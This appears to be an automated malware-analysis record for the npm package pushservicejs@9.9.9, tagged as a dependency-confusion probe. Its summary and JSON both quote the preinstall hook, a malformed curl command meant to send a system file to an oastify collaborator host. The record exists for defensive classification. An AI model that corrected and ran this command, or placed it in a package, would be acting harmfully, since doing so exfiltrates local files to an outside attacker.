# npm pushservicejs@9.9.9

**Source:** datadog · **Source label:** malicious · **Released:** 2024-12-02 (registry) · **Assessment:** malicious (medium) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package holds only a package.json whose preinstall hook is a single sh command line: `/usr/bin/curl --data '@/etc/passed' &(host)<collaborator>[.]oastify[.]com`. The intent is to send a local system file to an OAST (Burp Collaborator style) host, typical of a dependency-confusion probe with an inflated 9.9.9 version. There are no gates: the hook has no shell tests and no other files. The command is broken, so no behaviour is recorded as reachable.

## Execution

- **preinstall** `/usr/bin/curl --data '@/etc/passed' &(host)zkno9i5yayunudppg0yby7q3vu1lpdd2[.]oastify[.]com`: no package files; inline_shell.

## Gates

None.

## Requirements

None.

## Behaviour

- Ungated: none
- Gated: none

## Notes

- `(host)` followed directly by a word is a shell syntax error, so sh should reject the whole line before curl starts. This is reasoned from POSIX grammar, not observed.
- Even if it parsed, curl has no URL argument and `/etc/passed` (a typo of `/etc/passwd`) does not exist on standard systems.
- The collaborator host is zkno…[.]oastify[.]com (subdomain id redacted). No endpoint is listed in reachability because nothing is contacted at install.
- Registry metadata names the publisher; not recorded (rule 5).

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "pushservicejs",
    "version": "9.9.9",
    "archive_sha256": "ec269795f1efd506086043ab95892beb5ff781067b4d7cdeaa35f317f3b38679",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2024-12-02",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2024-12-02-pushservicejs-v9.9.9.zip",
    "package_root": "layer0/tmp/tmpbtphvq_3/pushservicejs/package",
    "cluster_key": "85bec007b5026e2973e703d7647d90871863da640d287b9bbf5a12ecef47efb1",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "/usr/bin/curl --data '@/etc/passed' &(host)zkno9i5yayunudppg0yby7q3vu1lpdd2[.]oastify[.]com",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "package.json is the only file in the package (no index.js despite main). The preinstall hook string was read in full; nothing else is install-reached.",
      "Intent: POST the contents of a local file (/etc/passed, apparently a typo of /etc/passwd) with curl to an OAST collaborator host (zkno…[.]oastify[.]com). Nothing is downloaded or run, so launch style is inline_shell, not download_then_exec.",
      "The hook is broken. In POSIX sh a subshell `(host)` cannot be followed by a word, so `(host)zkno…` is a syntax error and sh rejects the whole line before running curl. The install fails with a shell error.",
      "Even if it parsed, curl gets no URL (the host is not a curl argument) and /etc/passed does not exist on standard systems, so no data would be sent. Behaviours stay empty either way; the intended exfil is recorded only in notes and assessment.",
      "No conditions or gates: the hook has no shell tests and the tool found no candidates."
    ]
  },
  "requirements": [],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": false,
    "endpoints": []
  },
  "attack_type": "dependency_confusion",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook tries to POST a local system file (/etc/passed, likely meant to be /etc/passwd) with curl to an OAST collaborator host, a dependency-confusion style probe under an inflated 9.9.9 version. The command is malformed (shell syntax error, no URL given to curl, wrong path), so no behaviour actually runs at install.",
  "label_disagreement": false,
  "confidence": "medium",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
